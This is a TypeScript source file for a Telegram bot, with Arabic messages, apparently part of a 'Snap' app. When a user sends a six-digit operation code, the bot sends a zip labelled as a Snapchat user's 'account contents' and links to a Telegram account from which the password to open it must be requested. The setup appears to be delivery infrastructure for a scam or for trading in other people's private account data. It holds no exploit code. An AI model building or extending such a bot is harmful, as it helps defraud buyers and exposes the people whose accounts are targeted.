import TelegramBot from "node-telegram-bot-api";
import { logger } from "./logger";
import { getOperationUsername, buildAccountZip, CONTENT_TEXT } from "../routes/snap-profile";

const TOKEN = process.env["TELEGRAM_BOT_TOKEN"];

/* chatId -> state */
const awaitingCode = new Set<number>();

export function startSnapBot() {
  if (!TOKEN) {
    logger.warn("TELEGRAM_BOT_TOKEN not set — Telegram bot disabled");
    return;
  }

  const bot = new TelegramBot(TOKEN, { polling: true });
  logger.info("Snap Telegram bot started");

  /* ── /start ── */
  bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    awaitingCode.add(chatId);
    bot.sendMessage(
      chatId,
      `👻 *مرحباً بك في بوت سناب*\n\nأرسل *رمز العملية* المكوّن من 6 أرقام لتحميل الملف.`,
      { parse_mode: "Markdown" }
    );
  });

  /* ── incoming messages ── */
  bot.on("message", async (msg) => {
    const chatId = msg.chat.id;
    const text = (msg.text ?? "").trim();

    if (text.startsWith("/")) return;
    if (!awaitingCode.has(chatId)) {
      awaitingCode.add(chatId);
      bot.sendMessage(chatId, `أرسل رمز العملية المكوّن من 6 أرقام:`);
      return;
    }

    if (!/^\d{6}$/.test(text)) {
      bot.sendMessage(chatId, `⚠️ الرمز يجب أن يكون 6 أرقام فقط. أعد المحاولة:`);
      return;
    }

    const username = getOperationUsername(text);
    if (!username) {
      bot.sendMessage(
        chatId,
        `❌ *رمز غير صالح أو منتهي الصلاحية.*\n\nيرجى العودة إلى التطبيق والحصول على رمز جديد.`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    awaitingCode.delete(chatId);

    // Send caption with content list
    const caption =
      `👤 *@${username}*\n\n` +
      CONTENT_TEXT +
      `\n\n⬇️ اضغط الزر أدناه لطلب كلمة فتح الملف`;

    try {
      await bot.sendMessage(chatId, `⏳ جارٍ إنشاء الملف...`);

      const zipBuffer = buildAccountZip(username);
      const filename = `محتويات الحساب ...${username}.zip`;

      await bot.sendDocument(
        chatId,
        zipBuffer,
        {
          caption,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [[
              { text: "🔐 طلب كلمة فتح الملف", url: "https://t.me/OX_U1" },
            ]],
          },
        },
        { filename, contentType: "application/zip" }
      );
    } catch (err) {
      logger.error({ err }, "Failed to send zip to Telegram user");
      bot.sendMessage(chatId, `❌ حدث خطأ أثناء إنشاء الملف. يرجى المحاولة لاحقاً.`);
      awaitingCode.add(chatId);
    }
  });

  bot.on("polling_error", (err) => logger.error({ err }, "Telegram polling error"));
}
